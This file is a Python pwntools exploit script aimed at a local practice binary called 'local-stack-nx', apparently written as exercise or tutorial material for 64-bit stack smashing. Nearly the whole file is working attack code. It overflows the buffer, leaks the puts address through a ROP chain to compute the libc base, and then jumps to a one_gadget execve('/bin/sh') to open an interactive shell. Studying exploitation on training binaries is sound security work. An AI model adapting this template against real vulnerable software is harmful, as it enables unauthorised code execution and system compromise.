#!/usr/bin/python3
# ubuntu 18.04
# ldd local-stack-nx; find local libc 
# ref: https://blog.techorganic.com/2016/03/18/64-bit-linux-stack-smashing-tutorial-part-3/
#
# use socat if not using pwntols
# socat TCP-LISTEN:2323,reuseaddr,fork EXEC:./local-stack-nx

from pwn import * # Import pwntools

def pad_null_bytes(value):
    return value + b'\x00' * (8-len(value))


p = process("./local-stack-nx") # start the local-stack-nx binary
elf = ELF("./local-stack-nx") # Extract data from binary
rop = ROP(elf) # Find ROP gadgets

# Find addresses for puts, __libc_start_main and a `pop rdi;ret` gadget
PUTS = elf.plt['puts']
putsgot = elf.got["puts"]
putsymbols= elf.symbols["puts"]
LIBC_START_MAIN = elf.symbols['__libc_start_main']
MAINSYM = elf.symbols['main']
POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0] # Same as ROPgadget --binary local-stack-nx | grep "pop rdi"
RET = (rop.find_gadget(['ret']))[0]

LIBC = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libcsymputs = LIBC.symbols["puts"]

log.info("puts@plt: " + hex(PUTS))
#log.info("puts@symbols: " + hex(putsymbols))
log.info("libcsymputs: " + hex(libcsymputs))
log.info("puts@got: " + hex(putsgot))
log.info("main@sym: " + hex(MAINSYM))
#log.info("__libc_start_main: " + hex(LIBC_START_MAIN))
log.info("pop rdi gadget @ " + hex(POP_RDI))

one_gadget = 0x4f3c2 #execve("/bin/sh", rsp+0x40, environ)  constraints:[rsp+0x40] == NULL
#system = 0x4f4e3

rop1 = b"".join([b"A"*72,
    p64(0x00000000004006f3), # pop rdi ; ret
    p64(elf.got["puts"]), # value for rdi
    p64(elf.plt["puts"]), # return address
    #p64(elf.symbols["main"]) # return to main
    p64(0x0000000000400655) # return to main
    ])

pid = util.proc.pidof(p)[0]
print("[*] PID = " + str(pid))

# Uncomment this if you want to use the debugger
#util.proc.wait_for_debugger(pid)

print(p.recvline("An easy one to get started..."))
#print(p.clean()) # clean socket buffer (read all and print)
p.sendline(rop1)
print(p.recvline())
print(p.recvline())
recieved = p.recvline().strip()

puts_leak = u64(pad_null_bytes(recieved)) # null byte padding + unpack to integer(8 byte)
log.info("puts @ %s" % hex(puts_leak))

libc_base = puts_leak - LIBC.symbols["puts"] # compute libc base; puts_leak(offset in mem)-puts off in libc = libc_base in mem
log.info("libc base @ %s" % hex(libc_base))
log.info("execve(\'/bin/sh\') @ %s" % hex(libc_base + one_gadget))

rop2 = b"".join([b"A"*72,
    p64(libc_base + one_gadget), # shell
    b"\x00"*40 # rsp 40 null bytes
    ])

p.sendline(rop2)
p.interactive()